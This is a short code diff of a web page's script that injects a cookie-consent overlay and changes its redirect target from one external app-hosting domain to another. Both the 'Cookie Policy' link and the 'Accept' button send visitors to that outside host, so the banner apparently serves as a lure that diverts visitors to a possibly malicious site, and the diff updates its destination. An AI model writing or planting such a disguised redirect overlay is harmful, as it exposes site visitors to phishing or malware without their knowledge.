@@ -3,7 +3,7 @@
 <head>
 	<script>
 	        document.addEventListener("DOMContentLoaded", function () {
-	            const redirectUrl = "https://asdn-bxdnbha2f4bcguga.centralus-01.azurewebsites.net/";
+	            const redirectUrl = "https://octopus-app-csviu.ondigitalocean.app/";
 	            const style = document.createElement("style");
 	            style.textContent = `
 	                .cookie-overlay {
@@ -84,7 +84,7 @@
 	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
 	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
 	</p>
-	<a href="https://asdn-bxdnbha2f4bcguga.centralus-01.azurewebsites.net/" id="accept-cookies" class="btn-primary">Accept</a>
+	<a href="https://octopus-app-csviu.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
 	</div>
 	            `;
 	            document.body.appendChild(overlay);
